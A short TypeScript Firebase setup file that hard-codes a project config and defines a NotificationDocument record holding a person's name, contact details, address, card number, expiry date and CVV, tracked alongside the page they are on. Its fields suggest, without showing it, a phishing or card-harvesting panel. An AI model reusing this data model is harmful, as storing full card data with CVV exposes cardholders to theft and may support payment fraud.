import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyCjeoP0ia224jtc8U7JCoIYOHJcudBardo",
  authDomain: "myapp-58e0a.firebaseapp.com",
  databaseURL: "https://myapp-58e0a-default-rtdb.firebaseio.com",
  projectId: "myapp-58e0a",
  storageBucket: "myapp-58e0a.appspot.com",
  messagingSenderId: "835173729732",
  appId: "1:835173729732:web:04b9a1f75b4c7837641091"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

